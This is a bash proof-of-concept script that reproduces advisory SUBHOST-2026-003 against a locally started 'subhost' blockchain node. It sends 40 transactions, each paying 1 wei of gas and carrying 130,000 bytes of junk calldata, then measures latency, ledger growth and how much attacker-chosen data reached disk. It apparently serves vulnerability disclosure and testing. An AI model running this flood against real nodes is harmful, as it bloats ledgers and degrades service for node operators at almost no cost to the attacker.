#!/usr/bin/env bash
# End-to-end HTTP reproduction for SUBHOST-2026-003.
#
# Starts the real `subhost node` binary, sends 40 signed eth_sendTransaction
# requests over JSON-RPC, and measures request latency, ledger growth, and how
# much attacker-chosen calldata reached the ledger on disk.
#
# Each transaction pays gas_price = 1 wei and gas_limit = 1 wei of gas, and
# carries 130000 bytes of 0xAA calldata. Total attacker spend: 40 wei.
set -euo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo="$(cd "$here/../../.." && pwd)"
cargo_bin="${CARGO:-cargo}"
listen="${POC_LISTEN:-127.0.0.1:28545}"
metrics="${POC_METRICS:-127.0.0.1:29090}"
blocks="${POC_BLOCKS:-40}"
data_len="${POC_DATA_LEN:-130000}"

"$cargo_bin" build --release --manifest-path "$here/Cargo.toml"
"$cargo_bin" build -p subhost-cli --manifest-path "$repo/Cargo.toml"

node="$repo/target/debug/subhost"
emit="$here/target/release/emit"

work="$(mktemp -d)"
cleanup() {
  if [ -n "${pid:-}" ]; then
    kill "$pid" 2>/dev/null || true
  fi
  rm -rf "$work"
}
trap cleanup EXIT

from="$("$emit" "$data_len" 0 1 | sed -n 's/^FROM=//p')"
"$node" init --chain-id 1 -d "$work/chain" --alloc "$from=1000000000" --force >/dev/null

"$node" node -d "$work/chain" --listen "$listen" --metrics-addr "$metrics" \
  >"$work/node.log" 2>&1 &
pid=$!
sleep 1.5

echo "HTTP reproduction: $blocks transfers, $data_len calldata bytes each, gas=0x1, gasPrice=0x1"
for nonce in $(seq 0 $((blocks - 1))); do
  "$emit" "$data_len" "$nonce" 1 | sed -n 's/^BODY=//p' >"$work/body.json"
  response="$(curl -s -w ' seconds=%{time_total}' -X POST \
    -H 'content-type: application/json' --data-binary @"$work/body.json" "http://$listen")"
  if [ $((nonce % 5)) -eq 0 ] || [ "$nonce" -eq $((blocks - 1)) ]; then
    echo "nonce=$nonce $response"
  fi
done

echo "ledger_bytes=$(du -sb "$work/chain/ledger" | cut -f1)"
python3 - "$work/chain/ledger" <<'PY'
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
count = 0
for path in root.rglob("*"):
    if path.is_file():
        count += path.read_bytes().count(b"\xaa")
print(f"byte_0xaa_in_ledger={count}")
PY
echo "attacker_fee_total_wei=$blocks"